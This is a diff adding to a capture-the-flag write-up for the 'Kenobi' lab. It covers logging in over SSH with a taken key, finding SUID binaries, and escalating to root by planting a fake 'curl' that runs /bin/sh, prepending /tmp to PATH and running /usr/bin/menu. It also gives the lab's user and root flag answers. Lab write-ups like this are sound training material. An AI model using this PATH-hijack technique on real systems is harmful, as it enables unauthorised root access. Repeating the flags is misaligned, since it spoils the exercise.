@@ -103,6 +103,46 @@ next we need t set permissions for rw and execute,
 
 ```ssh kenobi@10.10.152.93 -i id_rsa```
 
+What is Kenobi's user flag (/home/kenobi/user.txt)?
+
+Answer-```d0b0f3f53b6caa532a83915e19224899```
+
+# Task 4 Privilege Escalation with Path Variable Manipulation
+
+To search the a system for these type of files run the following: ```find / -perm -u=s -type f 2>/dev/null```
+
+What file looks particularly out of the ordinary? 
+
+Answer-```/usr/bin/menu```
+
+Run the binary, how many options appear?
+
+Answer-```3```
+
+next using string command to read strings in the binary
+
+```curl -I localhost```
+
+```uname -r```
+
+```ifconfig```
+
+```echo /bin/sh > curl```
+
+```chmod 777 curl```
+
+```export PATH=/tmp:$PATH```
+
+```/usr/bin/menu```
+
+I entered choice ```1``` and boom had root acccess.
+
+What is the root flag (/root/root.txt)?
+
+```cat /root/root.txt```
+
+Answer-```177b3cd8562289f37382721c28381f02```
+
 
 
 
